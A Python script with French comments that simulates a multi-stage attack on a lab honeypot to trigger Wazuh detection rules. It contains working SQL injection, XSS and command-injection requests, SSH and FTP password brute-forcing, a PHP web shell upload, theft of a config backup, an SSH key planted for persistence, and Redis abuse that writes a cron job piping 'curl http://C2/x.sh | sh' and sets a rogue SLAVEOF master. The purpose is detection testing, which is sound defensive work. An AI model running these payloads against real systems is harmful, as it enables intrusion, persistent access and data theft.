#!/usr/bin/env python3
"""
attack_demo.py — simulation d'attaque pour la démo (et pour test_srv01.sh --e2e)

Rejoue un scénario d'attaquant réaliste contre NIX01 :
  web   : scanner, SQLi (contournement du login), XSS, DELETE /admin, fichiers sensibles, brute force 404
  ssh   : brute force (7 mots de passe), connexion root:123456, recon, wget de malware,
          chmod +x, clé SSH persistante, effacement de l'historique
  ftp   : brute force, connexion admin:admin, vol de config.php.bak, dépôt d'un web shell
  redis : AUTH en boucle, CONFIG SET dir/dbfilename + SAVE (cron), SLAVEOF (rogue master),
          MODULE LOAD, EVAL, FLUSHALL, requête HTTP cross-protocol

  python3 tools/attack_demo.py                       # tout, cible 192.168.56.101
  python3 tools/attack_demo.py --only ssh,redis --slow
  python3 tools/attack_demo.py --target 10.0.0.5 --quiet

Dépendances : stdlib ; pour SSH, paramiko (pip install paramiko) OU sshpass + ssh.
À utiliser UNIQUEMENT contre le lab (réseau host-only).
"""
import argparse
import ftplib
import io
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request

C2 = "198.51.100.7"  # IP de documentation (RFC 5737) : jamais routée
SSH_PORT, FTP_PORT, REDIS_PORT, WEB_PORT = 2222, 21, 6379, 5000
ARGS = None


def say(msg, color="36"):
    if not ARGS.quiet:
        print(f"\033[{color}m{msg}\033[0m", flush=True)


def step(title, rules):
    say(f"\n=== {title}  ->  règles attendues : {rules}", "1;33")
    if ARGS.slow:
        time.sleep(2)


def pause():
    if ARGS.slow:
        time.sleep(1)


# --------------------------------------------------------------------------- web
def http(method, path, data=None, ua="Mozilla/5.0"):
    req = urllib.request.Request(f"http://{ARGS.target}:{WEB_PORT}{path}", method=method,
                                 data=data.encode() if data else None, headers={"User-Agent": ua})
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    try:
        code = urllib.request.build_opener(NoRedirect).open(req, timeout=5).status
    except urllib.error.HTTPError as e:
        code = e.code
    say(f"  {method:6} {path[:60]:<60} -> HTTP {code}", "37")
    pause()


def attack_web():
    step("WEB SweetBuzz :5000", "100112 100111 100110 100120 100130 100150 100140 100191")
    http("GET", "/login", ua="sqlmap/1.7.2#stable (https://sqlmap.org)")
    http("POST", "/login", "username=admin%27+--+&password=x")
    http("GET", "/?q=1%27%20UNION%20SELECT%201,2,3--")
    http("POST", "/feedback", "name=attacker&comment=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E")
    http("DELETE", "/admin")
    http("GET", "/?host=127.0.0.1;whoami")
    for p in ("/.env", "/.git/config", "/backup.sql"):
        http("GET", p)
    for i in range(10):
        http("GET", f"/admin-{i}.php", ua="gobuster/3.6")


# --------------------------------------------------------------------------- ssh
SSH_CMDS = [
    "uname -a",
    "cat /etc/passwd",
    f"wget http://{C2}/bot.sh -O /tmp/bot.sh",
    "chmod +x /tmp/bot.sh",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7demo attacker@kali' >> ~/.ssh/authorized_keys",
    "history -c",
    "exit",
]
BRUTE = ["admin", "root", "toor1", "qwerty", "letmein", "P@ssw0rd", "changeme"]


def ssh_backend():
    try:
        import paramiko  # noqa: F401
        return "paramiko"
    except ImportError:
        pass
    if shutil.which("sshpass") and shutil.which("ssh"):
        return "sshpass"
    return None


def ssh_try(backend, user, pw, script=None):
    if backend == "paramiko":
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            c.connect(ARGS.target, SSH_PORT, username=user, password=pw, look_for_keys=False,
                      allow_agent=False, timeout=8, banner_timeout=8, auth_timeout=8)
        except paramiko.AuthenticationException:
            return False
        if script:
            ch = c.invoke_shell()
            time.sleep(0.5)
            for cmd in script:
                say(f"  root@srv-db01:~# {cmd}", "37")
                ch.send(cmd + "\r")
                time.sleep(1.2 if ARGS.slow else 0.4)
            end = time.time() + 5
            while not ch.exit_status_ready() and time.time() < end:
                time.sleep(0.1)
        c.close()
        return True
    base = ["sshpass", "-p", pw, "ssh", "-p", str(SSH_PORT), "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null", "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no", "-o", "NumberOfPasswordPrompts=1", "-o", "LogLevel=ERROR",
            "-o", "ConnectTimeout=8", f"{user}@{ARGS.target}"]
    stdin = ("\n".join(script) + "\n") if script else "exit\n"
    if script:
        for cmd in script:
            say(f"  root@srv-db01:~# {cmd}", "37")
    r = subprocess.run(base, input=stdin, capture_output=True, text=True, timeout=60)
    return r.returncode != 5


def attack_ssh():
    step("SSH :2222", "100401 100402 100410 100404 100423 100421 100422")
    backend = ssh_backend()
    if not backend:
        say("  [!] ni paramiko ni sshpass : SSH ignoré (pip install paramiko / apt install sshpass)", "31")
        return
    for pw in BRUTE:
        res = ssh_try(backend, "root", pw)
        say(f"  root:{pw:<10} -> {'OK' if res else 'refusé'}", "37")
    say("  root:123456    -> connexion", "32")
    ssh_try(backend, "root", "123456", SSH_CMDS)


# --------------------------------------------------------------------------- ftp
def attack_ftp():
    step("FTP :21", "100401 100402 100410 100404 100432 100431")
    for pw in BRUTE:
        f = ftplib.FTP()
        f.connect(ARGS.target, FTP_PORT, timeout=10)
        try:
            f.login("admin", pw)
        except ftplib.error_perm:
            say(f"  admin:{pw:<10} -> 530 Login incorrect", "37")
        f.close()
    f = ftplib.FTP()
    f.connect(ARGS.target, FTP_PORT, timeout=10)
    say(f"  admin:admin      -> {f.login('admin', 'admin')}", "32")
    f.cwd("backup")
    say("  LIST /backup", "37")
    f.retrlines("LIST", lambda line: say("    " + line, "37"))
    buf = io.BytesIO()
    f.retrbinary("RETR config.php.bak", buf.write)
    say(f"  RETR config.php.bak -> {buf.getvalue()[:60]!r}", "37")
    pause()
    shell = b"<?php if(isset($_GET['c'])){system($_GET['c']);} ?>\n"
    say(f"  STOR shell.php -> {f.storbinary('STOR shell.php', io.BytesIO(shell))}", "37")
    f.quit()


# --------------------------------------------------------------------------- redis
def resp(*a):
    return b"*%d\r\n" % len(a) + b"".join(b"$%d\r\n%s\r\n" % (len(x.encode()), x.encode()) for x in a)


def redis_cmd(s, *a):
    s.sendall(resp(*a))
    time.sleep(0.1)
    out = s.recv(65536)
    shown = " ".join(a).replace("\n", "\\n")
    say(f"  redis> {shown[:70]:<70} {out[:50]!r}", "37")
    pause()
    return out


def attack_redis():
    step("REDIS :6379", "100401 100402 100410 100440 100445 100446 100441 100442 100443 100444 100447")
    s = socket.create_connection((ARGS.target, REDIS_PORT), 10)
    for pw in BRUTE:
        redis_cmd(s, "AUTH", pw)
    redis_cmd(s, "INFO", "server")
    redis_cmd(s, "CONFIG", "SET", "dir", "/var/spool/cron/crontabs")
    redis_cmd(s, "CONFIG", "SET", "dbfilename", "root")
    redis_cmd(s, "SET", "x", f"\n\n*/1 * * * * curl -fsSL http://{C2}/x.sh | sh\n\n")
    redis_cmd(s, "SAVE")
    redis_cmd(s, "SLAVEOF", C2, "21000")
    redis_cmd(s, "MODULE", "LOAD", "/tmp/exp.so")
    redis_cmd(s, "EVAL", 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); return 1', "0")
    redis_cmd(s, "FLUSHALL")
    redis_cmd(s, "QUIT")
    s.close()
    s = socket.create_connection((ARGS.target, REDIS_PORT), 10)
    s.sendall(f"POST / HTTP/1.1\r\nHost: {ARGS.target}:6379\r\n\r\n".encode())
    time.sleep(0.3)
    s.close()
    say("  POST / HTTP/1.1 (SSRF) -> connexion fermée par Redis", "37")


def main():
    global ARGS
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="192.168.56.101")
    ap.add_argument("--only", default="web,ssh,ftp,redis", help="liste parmi web,ssh,ftp,redis")
    ap.add_argument("--slow", action="store_true", help="pauses pour commenter la démo")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--ports", default="", help="ex. ssh=22022,ftp=22021 (tests locaux)")
    ARGS = ap.parse_args()
    global SSH_PORT, FTP_PORT, REDIS_PORT, WEB_PORT
    ports = dict(kv.split("=") for kv in ARGS.ports.split(",") if "=" in kv)
    SSH_PORT = int(ports.get("ssh", SSH_PORT))
    FTP_PORT = int(ports.get("ftp", FTP_PORT))
    REDIS_PORT = int(ports.get("redis", REDIS_PORT))
    WEB_PORT = int(ports.get("web", WEB_PORT))
    todo = {"web": attack_web, "ssh": attack_ssh, "ftp": attack_ftp, "redis": attack_redis}
    errors = 0
    for name in ARGS.only.split(","):
        try:
            todo[name.strip()]()
        except Exception as e:  # noqa: BLE001
            errors += 1
            print(f"\033[31m[!] {name}: {type(e).__name__}: {e}\033[0m", file=sys.stderr)
    say("\nTerminé. Alertes : dashboard Wazuh > Honeypot, ou sur SRV01 :\n"
        "  sudo python3 /vagrant/tools/show_alerts.py", "1;32")
    sys.exit(1 if errors else 0)


if __name__ == "__main__":
    main()
